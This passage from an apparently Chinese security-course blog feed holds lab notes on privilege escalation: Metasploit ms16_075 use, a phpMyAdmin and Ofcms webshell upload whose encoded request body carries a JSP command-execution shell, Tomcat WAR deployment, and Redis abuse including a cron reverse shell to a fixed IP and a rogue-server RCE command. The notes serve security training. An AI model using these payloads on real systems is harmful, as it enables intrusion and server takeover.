时，只出现了一个，设置为true打开后出现了很多</strong>（这里显示的172.16.41.220是公网ip对应主机的内网ip，不用在意）</h5><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418152742549.png" alt="image-20230418152742549"></p><p>这里显示NO的就不用测试了，测试YES的，这里选择ms16_075进行测试</p><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418153035759.png" alt="image-20230418153035759"></p><h5 id="3、利用EXP溢出提权"><a href="#3、利用EXP溢出提权" class="headerlink" title="3、利用EXP溢出提权"></a>3、利用EXP溢出提权</h5><p>background(退出到msf6) &#x2F;&#x2F;把你当前的metasploit shell转为后台执行。</p><p>use exploit&#x2F;windows&#x2F;local&#x2F;ms16_075_reflection_juicy（复制上面的ms16_075模块）</p><p>set session 1</p><p>exploit</p><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418153432703.png" alt="image-20230418153432703"></p><h6 id="run之后这里失败了，提示错误"><a href="#run之后这里失败了，提示错误" class="headerlink" title="run之后这里失败了，提示错误"></a>run之后这里失败了，提示错误</h6><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418160012535.png" alt="image-20230418160012535"></p><h6 id="可能是端口默认端口4444占用了，换成6666，另外再用开启一个msfconsole监听，成功获取system权限"><a href="#可能是端口默认端口4444占用了，换成6666，另外再用开启一个msfconsole监听，成功获取system权限" class="headerlink" title="可能是端口默认端口4444占用了，换成6666，另外再用开启一个msfconsole监听，成功获取system权限"></a>可能是端口默认端口4444占用了，换成6666，另外再用开启一个msfconsole监听，成功获取system权限</h6><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418155625475.png" alt="image-20230418155625475"></p><h6 id="下面测试靶机win2012，上面的msf-exe对于2008和2012的都有效"><a href="#下面测试靶机win2012，上面的msf-exe对于2008和2012的都有效" class="headerlink" title="下面测试靶机win2012，上面的msf.exe对于2008和2012的都有效"></a>下面测试靶机win2012，上面的msf.exe对于2008和2012的都有效</h6><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418160641548.png" alt="image-20230418160641548"></p><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418161005935.png" alt="image-20230418161005935"></p><h3 id="Web-amp-Win16-amp-19-Ladon半自动-上传-amp-插件-amp-利用（插件使用在第一个案例）"><a href="#Web-amp-Win16-amp-19-Ladon半自动-上传-amp-插件-amp-利用（插件使用在第一个案例）" class="headerlink" title="#Web&amp;Win16&amp;19-Ladon半自动-上传&amp;插件&amp;利用（插件使用在第一个案例）"></a>#Web&amp;Win16&amp;19-Ladon半自动-上传&amp;插件&amp;利用（插件使用在第一个案例）</h3><p><a href="https://github.com/k8gege/Ladon">https://github.com/k8gege/Ladon</a></p><p>ladon40 badpotato whoami</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92</summary>
      
    
    
    
    <category term="权限提升" scheme="http://example.com/categories/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    
    
  </entry>
  
  <entry>
    <title>Day97 权限提升-Web权限&amp;权限划分&amp;源码后台&amp;中间件&amp;第三方&amp;数据库等</title>
    <link href="http://example.com/2023/04/17/Day97-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Web%E6%9D%83%E9%99%90-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86-%E6%BA%90%E7%A0%81%E5%90%8E%E5%8F%B0-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E7%AC%AC%E4%B8%89%E6%96%B9-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/"/>
    <id>http://example.com/2023/04/17/Day97-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Web%E6%9D%83%E9%99%90-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86-%E6%BA%90%E7%A0%81%E5%90%8E%E5%8F%B0-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E7%AC%AC%E4%B8%89%E6%96%B9-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/</id>
    <published>2023-04-17T02:35:09.000Z</published>
    <updated>2023-04-23T08:20:35.252Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/../images/Day97-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Web%E6%9D%83%E9%99%90-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86-%E6%BA%90%E7%A0%81%E5%90%8E%E5%8F%B0-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E7%AC%AC%E4%B8%89%E6%96%B9-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/Xyd9L5Iuysd2ZLwVhivGlQ.png" alt="img"></p><p><img src="/../images/Day97-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Web%E6%9D%83%E9%99%90-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86-%E6%BA%90%E7%A0%81%E5%90%8E%E5%8F%B0-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E7%AC%AC%E4%B8%89%E6%96%B9-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/image-20230423161754972.png" alt="image-20230423161754972"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、前面-中期-后期对应知识关系</p><p>2、明确当前权限常见的获取方式</p><p>3、明确当前权限对应可操作事情</p><p>4、后台权限提升网站权限常规操作</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、Web权限提升</p><p>2、系统权限提升</p><p>3、域控权限提升</p><h3 id="详细点："><a href="#详细点：" class="headerlink" title="#详细点："></a>#详细点：</h3><h4 id="1、具体有哪些权限需要我们了解掌握的？"><a href="#1、具体有哪些权限需要我们了解掌握的？" class="headerlink" title="1、具体有哪些权限需要我们了解掌握的？"></a>1、具体有哪些权限需要我们了解掌握的？</h4><p>后台权限，网站权限，数据库权限，接口权限，系统权限，域控权限等</p><h4 id="2、以上常见权限获取方法简要归类说明？"><a href="#2、以上常见权限获取方法简要归类说明？" class="headerlink" title="2、以上常见权限获取方法简要归类说明？"></a>2、以上常见权限获取方法简要归类说明？</h4><p>后台权限：SQL注入,数据库备份泄露，默认或弱口令等获取帐号密码进入</p><p>网站权限：后台提升至网站权限，RCE或文件操作类、反序列化等漏洞直达Shell</p><p>数据库权限：SQL注入,数据库备份泄露，默认或弱口令等进入或网站权限获取后转入</p><p>接口权限：SQL注入,数据库备份泄露，源码泄漏，培植不当等或网站权限获取后转入</p><p>系统权限：高危系统漏洞直达或网站权限提升转入、数据库权限提升转入，第三方转入等</p><p>域控权限：高危系统漏洞直达或内网横向渗透转入，域控其他服务安全转入等</p><h4 id="3、以上常见权限获取后能操作的具体事情"><a href="#3、以上常见权限获取后能操作的具体事情" class="headerlink" title="3、以上常见权限获取后能操作的具体事情?"></a>3、以上常见权限获取后能操作的具体事情?</h4><h5 id="后台权限"><a href="#后台权限" class="headerlink" title="后台权限:"></a>后台权限:</h5><p>常规WEB界面文章分类等操作，后台功能可操作类</p><h5 id="网站权限："><a href="#网站权限：" class="headerlink" title="网站权限："></a>网站权限：</h5><p>查看或修改程序源代码，可以进行网站或应用的配置文件读取（接口配置信息，数据库配置信息等），还能收集服务器操作系统相关的信息，为后续系统提权做准备。</p><h5 id="数据库权限："><a href="#数据库权限：" class="headerlink" title="数据库权限："></a>数据库权限：</h5><p>操作数据库的权限，数据库的增删改等，源码或配置文件泄漏，也可能是网站权限(webshell)进行的数据库配置文件读取获得。也可以作为提升系统权限手段。</p><h5 id="接口权限："><a href="#接口权限：" class="headerlink" title="接口权限："></a>接口权限：</h5><p>后台或网站权限后的获取途径：后台（修改配置信息功能点），网站权限（查看的配置文件获取），具体可以操作的事情大家自己想想。</p><p>系统权限：如同在你自己操作自己的电脑一样</p><p>域控权限：如同在你自己操作自己的虚拟机一样</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="➢-中间件语言类-权限-ASP-amp-NET-amp-PHP-amp-JSP"><a href="#➢-中间件语言类-权限-ASP-amp-NET-amp-PHP-amp-JSP" class="headerlink" title="➢ 中间件语言类-权限-ASP&amp;NET&amp;PHP&amp;JSP"></a>➢ 中间件语言类-权限-ASP&amp;NET&amp;PHP&amp;JSP</h4><h4 id="➢-第三方应用类-Phpmyadmin后台Getshell操作"><a href="#➢-第三方应用类-Phpmyadmin后台Getshell操作" class="headerlink" title="➢ 第三方应用类-Phpmyadmin后台Getshell操作"></a>➢ 第三方应用类-Phpmyadmin后台Getshell操作</h4><h4 id="➢-网站CMS源码类-Ofcms系统后台Getshell操作"><a href="#➢-网站CMS源码类-Ofcms系统后台Getshell操作" class="headerlink" title="➢ 网站CMS源码类-Ofcms系统后台Getshell操作"></a>➢ 网站CMS源码类-Ofcms系统后台Getshell操作</h4><h4 id="➢-Web容器中间件类-Tomcat平台后台Getshell操作"><a href="#➢-Web容器中间件类-Tomcat平台后台Getshell操作" class="headerlink" title="➢ Web容器中间件类-Tomcat平台后台Getshell操作"></a>➢ Web容器中间件类-Tomcat平台后台Getshell操作</h4><h4 id="➢-数据库服务类-Redis未授权管理终端Getshell操作"><a href="#➢-数据库服务类-Redis未授权管理终端Getshell操作" class="headerlink" title="➢ 数据库服务类-Redis未授权管理终端Getshell操作"></a>➢ 数据库服务类-Redis未授权管理终端Getshell操作</h4></blockquote><p><img src="/../images/Day97-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Web%E6%9D%83%E9%99%90-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86-%E6%BA%90%E7%A0%81%E5%90%8E%E5%8F%B0-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E7%AC%AC%E4%B8%89%E6%96%B9-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/image-20230417141140734.png" alt="image-20230417141140734"></p><h4 id="中间件语言类-权限-ASP-amp-NET-amp-PHP-amp-JSP"><a href="#中间件语言类-权限-ASP-amp-NET-amp-PHP-amp-JSP" class="headerlink" title="#中间件语言类-权限-ASP&amp;NET&amp;PHP&amp;JSP"></a>#中间件语言类-权限-ASP&amp;NET&amp;PHP&amp;JSP</h4><h5 id="1、中间件语言："><a href="#1、中间件语言：" class="headerlink" title="1、中间件语言："></a>1、中间件语言：</h5><p>JSP：Tomcat</p><p>ASP&amp;NET：IIS</p><p>PHP：LAMP&amp;软件</p><h5 id="2、权限划分"><a href="#2、权限划分" class="headerlink" title="2、权限划分"></a>2、权限划分</h5><p><strong>Linux：</strong></p><p>管理员UID为0：系统的管理员用户。</p><p>系统用户UID为1～999：Linux系统为了避免因某个服务程序出现漏洞而被黑客提权至整台服务器，默认服务程序会由独立的系统用户负责运行，进而有效控制被破坏范围。</p><p>普通用户UID从1000开始：是由管理员创建的用于日常工作的用户。</p><p><strong>Windows</strong>：</p><p>用户及组：system administrator user guest等</p><p><strong>jsp搭建的网站webshell都是root权限，如果网站的权限是管理员一步步按照LAMP这样一个个配置安装的，那么拿到的webshell的权限就是普通用户的，但是如果管理员用的是phpstudy这种集成软件搭建的网站，上传了webshell拿到的权限就是root权限</strong></p><p><img src="/../images/Day97-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Web%E6%9D%83%E9%99%90-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86-%E6%BA%90%E7%A0%81%E5%90%8E%E5%8F%B0-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E7%AC%AC%E4%B8%89%E6%96%B9-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/image-20230417142555127.png" alt="image-20230417142555127"></p><h4 id="第三方应用类-Phpmyadmin后台Getshell操作"><a href="#第三方应用类-Phpmyadmin后台Getshell操作" class="headerlink" title="#第三方应用类-Phpmyadmin后台Getshell操作"></a>#第三方应用类-Phpmyadmin后台Getshell操作</h4><p><img src="/../images/Day97-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Web%E6%9D%83%E9%99%90-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86-%E6%BA%90%E7%A0%81%E5%90%8E%E5%8F%B0-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E7%AC%AC%E4%B8%89%E6%96%B9-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/image-20230417114507916.png" alt="image-20230417114507916"></p><p><a href="https://www.cnblogs.com/fzblog/p/13912387.html">https://www.cnblogs.com/fzblog/p/13912387.html</a></p><p>低版本：直接导出后门 高版本：secure防护利用日志记录保存后门</p><h6 id="数据库权限到web权限跨越"><a href="#数据库权限到web权限跨越" class="headerlink" title="数据库权限到web权限跨越"></a>数据库权限到web权限跨越</h6><h6 id="登陆后可以用sql语句写入后门"><a href="#登陆后可以用sql语句写入后门" class="headerlink" title="登陆后可以用sql语句写入后门"></a>登陆后可以用sql语句写入后门</h6><p><img src="/../images/Day97-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Web%E6%9D%83%E9%99%90-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86-%E6%BA%90%E7%A0%81%E5%90%8E%E5%8F%B0-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E7%AC%AC%E4%B8%89%E6%96%B9-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/image-20230417113851993.png" alt="image-20230417113851993"></p><h6 id="连接上车的后面，可以获取整个系统的盘符"><a href="#连接上车的后面，可以获取整个系统的盘符" class="headerlink" title="连接上车的后面，可以获取整个系统的盘符"></a>连接上车的后面，可以获取整个系统的盘符</h6><p><img src="/../images/Day97-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Web%E6%9D%83%E9%99%90-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86-%E6%BA%90%E7%A0%81%E5%90%8E%E5%8F%B0-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E7%AC%AC%E4%B8%89%E6%96%B9-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/image-20230417114133305.png" alt="image-20230417114133305"></p><h6 id="也可以由web权限到数据库权限，上传webshell获取到远程数据库的密码后连接"><a href="#也可以由web权限到数据库权限，上传webshell获取到远程数据库的密码后连接" class="headerlink" title="也可以由web权限到数据库权限，上传webshell获取到远程数据库的密码后连接"></a>也可以由web权限到数据库权限，上传webshell获取到远程数据库的密码后连接</h6><h4 id="网站CMS源码类-Ofcms系统后台Getshell操作"><a href="#网站CMS源码类-Ofcms系统后台Getshell操作" class="headerlink" title="#网站CMS源码类-Ofcms系统后台Getshell操作"></a>#网站CMS源码类-Ofcms系统后台Getshell操作</h4><p><a href="https://blog.csdn.net/oufua/article/details/82584637">(26条消息) ofcms v1.1版本 idea 部署步骤及相关问题 开源java cms_ofcms数据库失败_oufu的博客-CSDN博客</a></p><p><img src="/../images/Day97-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Web%E6%9D%83%E9%99%90-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86-%E6%BA%90%E7%A0%81%E5%90%8E%E5%8F%B0-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E7%AC%AC%E4%B8%89%E6%96%B9-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/image-20230417140204035.png" alt="image-20230417140204035"></p><p><img src="/../images/Day97-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Web%E6%9D%83%E9%99%90-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86-%E6%BA%90%E7%A0%81%E5%90%8E%E5%8F%B0-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E7%AC%AC%E4%B8%89%E6%96%B9-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/image-20230417114742771.png" alt="image-20230417114742771"></p><p><strong>利用后台已有功能点进行获取：SQL执行，文件上传，模版修改，外部引用等</strong></p><p><strong>1.明确功能点实现的意义是否满足网站权限的提升</strong></p><p><strong>2.不同的程序可以通过程序名版本进行网上公开资料利用</strong></p><p>file_path&#x3D;&amp;dirs&#x3D;%2F&amp;res_path&#x3D;res&amp;file_name&#x3D;..&#x2F;..&#x2F;static&#x2F;jsp_shell.jsp&amp;file_content&#x3D;%3C%25%0A++++if(%22p0desta%22.equals(request.getParameter(%22pwd%22)))%7B%0A++++++++java.io.InputStream+in+%3D+Runtime.getRuntime().exec(request.getParameter(%22i%22)).getInputStream()%3B%0A++++++++int+a+%3D+-1%3B%0A++++++++byte%5B%5D+b+%3D+new+byte%5B2048%5D%3B%0A++++++++out.print(%22%3Cpre%3E%22)%3B%0A++++++++while((a%3Din.read(b))!%3D-1)%7B%0A++++++++++++out.println(new+String(b))%3B%0A++++++++%7D%0A++++++++out.print(%22%3C%2Fpre%3E%22)%3B%0A++++%7D%0A%25%3E</p><h6 id="模板修改处"><a href="#模板修改处" class="headerlink" title="模板修改处"></a>模板修改处</h6><p><img src="/../images/Day97-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Web%E6%9D%83%E9%99%90-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86-%E6%BA%90%E7%A0%81%E5%90%8E%E5%8F%B0-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E7%AC%AC%E4%B8%89%E6%96%B9-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/image-20230417115215513.png" alt="image-20230417115215513"></p><h6 id="利用修改模板内容上传木马，但是发现时html后缀，而且页面中修改不了，所以采用抓包修改，并修改上传内容为木马"><a href="#利用修改模板内容上传木马，但是发现时html后缀，而且页面中修改不了，所以采用抓包修改，并修改上传内容为木马" class="headerlink" title="利用修改模板内容上传木马，但是发现时html后缀，而且页面中修改不了，所以采用抓包修改，并修改上传内容为木马"></a>利用修改模板内容上传木马，但是发现时html后缀，而且页面中修改不了，所以采用抓包修改，并修改上传内容为木马</h6><p><img src="/../images/Day97-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Web%E6%9D%83%E9%99%90-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86-%E6%BA%90%E7%A0%81%E5%90%8E%E5%8F%B0-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E7%AC%AC%E4%B8%89%E6%96%B9-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/image-20230417115440128.png" alt="image-20230417115440128"></p><h6 id="filename目录要跳跃两级，因为当前执行目录不在static"><a href="#filename目录要跳跃两级，因为当前执行目录不在static" class="headerlink" title="filename目录要跳跃两级，因为当前执行目录不在static"></a>filename目录要跳跃两级，因为当前执行目录不在static</h6><p><img src="/../images/Day97-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Web%E6%9D%83%E9%99%90-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86-%E6%BA%90%E7%A0%81%E5%90%8E%E5%8F%B0-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E7%AC%AC%E4%B8%89%E6%96%B9-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/image-20230417115728664.png" alt="image-20230417115728664"></p><h6 id="也可以web权限通过查找数据库中管理员账号密码登录后台"><a href="#也可以web权限通过查找数据库中管理员账号密码登录后台" class="headerlink" title="也可以web权限通过查找数据库中管理员账号密码登录后台"></a>也可以web权限通过查找数据库中管理员账号密码登录后台</h6><p><img src="/../images/Day97-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Web%E6%9D%83%E9%99%90-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86-%E6%BA%90%E7%A0%81%E5%90%8E%E5%8F%B0-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E7%AC%AC%E4%B8%89%E6%96%B9-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/image-20230417135849877.png" alt="image-20230417135849877"></p><h4 id="Web容器中间件类-Tomcat平台后台Getshell操作"><a href="#Web容器中间件类-Tomcat平台后台Getshell操作" class="headerlink" title="#Web容器中间件类-Tomcat平台后台Getshell操作"></a>#Web容器中间件类-Tomcat平台后台Getshell操作</h4><p><img src="/../images/Day97-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Web%E6%9D%83%E9%99%90-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86-%E6%BA%90%E7%A0%81%E5%90%8E%E5%8F%B0-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E7%AC%AC%E4%B8%89%E6%96%B9-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/image-20230417140743609.png" alt="image-20230417140743609"></p><p>上传WAR包自动解析部署-JSP压缩ZIP后修改WAR后缀</p><h4 id="数据库服务类-Redis未授权管理终端Getshell操作"><a href="#数据库服务类-Redis未授权管理终端Getshell操作" class="headerlink" title="#数据库服务类-Redis未授权管理终端Getshell操作"></a>#数据库服务类-Redis未授权管理终端Getshell操作</h4><p><img src="/../images/Day97-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Web%E6%9D%83%E9%99%90-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86-%E6%BA%90%E7%A0%81%E5%90%8E%E5%8F%B0-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E7%AC%AC%E4%B8%89%E6%96%B9-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/image-20230417140758210.png" alt="image-20230417140758210"></p><p>启动环境：&#x2F;opt&#x2F;redis-2.8.17# <code>redis-server /etc/redis.conf</code></p><h5 id="1-Webshell写入："><a href="#1-Webshell写入：" class="headerlink" title="1.Webshell写入："></a>1.Webshell写入：</h5><p><code>config set dir /home/wwwroot/default  #设置WEB写入目录</code></p><p><code>config set dbfilename test.php #设置写入文件名</code></p><p><code>set test &quot;&lt;?php phpinfo();?&gt;&quot;  #设置写入文件代码</code></p><p><code>bgsave                         #保存执行</code></p><p><code>save                           #保存执行</code></p><h5 id="2-计划任务反弹shell"><a href="#2-计划任务反弹shell" class="headerlink" title="2.计划任务反弹shell"></a>2.计划任务反弹shell</h5><p><code>config set dir /var/spool/cron/crontabs #设置写入计划任务目录</code></p><p><code>config set dbfilename root #设置写入文件名</code></p><p><code>set xx &quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/47.75.212.155/3333 0&gt;&amp;1\n\n\n&quot;  #设置写入文件代码</code></p><p><code>save         #保存执行</code></p><h5 id="3-Redis-RCE反弹shell"><a href="#3-Redis-RCE反弹shell" class="headerlink" title="3.Redis RCE反弹shell"></a>3.Redis RCE反弹shell</h5><p><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p><p><code>python redis-rogue-server.py --rhost=47.94.236.117 --lhost=47.75.212.155 --exp=exp.so</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/../images/Day97-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Web%E6%9D%83%E9%99%90-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86-%E6%BA%90%E7%A</summary>
      
    
    
    
    <category term="权限提升" scheme="http://example.com/categories/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    
    
  </entry>
  
  <entry>
    <title>Day96 代码审计-SAST&amp;IAST项目&amp;火线洞态&amp;Agent部署&amp;插件安装&amp;产品测评</title>
    <link href="http://example.com/2023/04/11/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/"/>
    <id>http://example.com/2023/04/11/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/</id>
    <published>2023-04-11T02:19:41.000Z</published>
    <updated>2023-04-14T09:42:12.674Z</updated>
    
    <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、代码审计-开源版&amp;商业版</p><p>2、代码审计-单语言&amp;多语言</p><p>3、代码审计-DAST&amp;SAST&amp;IAST</p><h3 id="Java审计知识点："><a href="#Java审计知识点：" class="headerlink" title="#Java审计知识点："></a>#Java审计知识点：</h3><p><a href="https://xz.aliyun.com/t/7945">https://xz.aliyun.com/t/7945</a> java代码审计常规思路和方法.pdf</p><p>SQL注入，XSS跨站，RCE执行，反序列化，身份验证，SPEL，SSTI，三方组件安全等</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、语言审计-PHP&amp;.Net&amp;Java&amp;Python</p><p>2、漏洞审计-注入&amp;上传&amp;RCE&amp;未授权等</p><p>3、框架审计-ThinkPHP&amp;Spring&amp;Flask等</p><p>4、工具审计-RIPS&amp;VCG&amp;Fortify&amp;Bandit等</p><p>5、技术审计-动静态调试&amp;DAST&amp;SAST&amp;IAST等</p><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/Qu9rvdL1uVm46pnMkdIKKw.png" alt="img"></p><p><img src="/../images/Day96-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SAST-IAST%E9%A1%B9%E7%9B%AE-%E7%81%AB%E7%BA%BF%E6%B4%9E%E6%80%81-Agent%E9%83%A8%E7%BD%B2-%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85-%E4%BA%A7%E5%93%81%E6%B5%8B%E8%AF%84/1KVCYs7pMFhVOkRfle1BnA.png" alt="img"></p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="➢-代码审计利器-IAST-插件"><a href="#➢-代码审计利器-IAST-插件" class="headerlink" title="➢ 代码审计利器-IAST-插件"></a>➢ 代码审计利器-IAST-插件</h4><h4 id="➢-代码审计利器-IAST-Agent"><a href="#➢-代码审计利器-IAST-Agent" class="headerlink" title="➢ 代码审计利器-IAST-Agent"></a>➢ 代码审计利器-IAST-Agent</h4></blockquote><h4 id="代码审计利器-IAST-火线洞态测评报告"><a href="#代码审计利器-IAST-火线洞态测评报告" class="headerlink" title="#代码审计利器-IAST-火线洞态测评报告"></a>#代码审计利器-IAST-火线洞态测评报告</h4><p>文档：<a href="https://doc.dongtai.io/docs/introduction">https://doc.dongtai.io/docs/introduction</a></p><p>安装：<a href="https://github.com/HXSecurity/DongTai">https://github.com/HXSecurity/DongTai</a></p><p>控制台：<a href="https://iast.huoxian.cn/project/projectManage">https://iast.huoxian.cn/project/projectManage</a></p><p>测试台：<a 